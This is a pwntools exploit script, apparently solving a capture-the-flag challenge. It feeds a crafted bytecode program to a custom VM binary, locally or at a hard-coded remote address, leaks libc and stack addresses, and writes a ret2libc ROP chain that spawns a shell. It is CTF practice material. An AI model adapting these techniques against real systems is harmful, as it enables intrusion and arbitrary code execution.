#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
# context.arch = 'i386'


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x15Cf
        # brva 0x148D
        c
        ''')
        input()


if args.REMOTE:
    p = remote('34.72.43.223', 49891)
else:
    p = process(exe.path)
GDB()


def check(x, y):
    if x < 0:
        x = 0xffffffffffffffff + x + 1
    if y < 0:
        y = 0xffffffffffffffff + y + 1
    return x, y


pa = b''


def op(t, x=0, y=0):
    global pa
    x, y = check(x, y)
    pa += p8(t) + p64(x) + p64(y)


rop = ROP(libc)

# find libc base
op(6, 0, -3)
op(5, 10, 0x4000)
op(1, 0, 10)  # 0 libc base
# find environ
op(6, 1, 0)
op(5, 10, libc.sym.environ)
op(1, 1, 10)  # 1 environ
# get stack
op(6, -2, 1)
op(5, 10, 0)
op(7, 1, 10)
# find ret
op(5, 10, 0x160)
op(2, 1, 10)
# set up to overwrite stack
op(6, 2, 1)
op(6, 3, 1)
op(6, 4, 1)

op(5, 10, 8)

op(1, 2, 10)
op(1, 3, 10)
op(1, 3, 10)
op(1, 4, 10)
op(1, 4, 10)
op(1, 4, 10)
# ROP
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh'))
system = libc.sym.system
## pop rdi
op(6, 5, 0)
op(5, 10, pop_rdi)
op(1, 5, 10)
op(6, -2, 2)
op(5, 10, 0)
op(8, 11, 5)
## binsh
op(6, 5, 0)
op(5, 10, binsh)
op(1, 5, 10)
op(6, -2, 3)
op(5, 10, 0)
op(8, 11, 5)
## system 
op(6, 5, 0)
op(5, 10, system)
op(1, 5, 10)
op(6, -2, 4)
op(5, 10, 0)
op(8, 11, 5)
## ret
op(6, 5, 0)
op(5, 10, pop_rdi+1)
op(1, 5, 10)
op(6, -2, 1)
op(5, 10, 0)
# op(8, 11, 5)

sla(b'size: ', str(len(pa)))
sla(b'Code: ', pa)

p.interactive()
'''
op(5, 0, 2)
op(8,1, 0)

'''
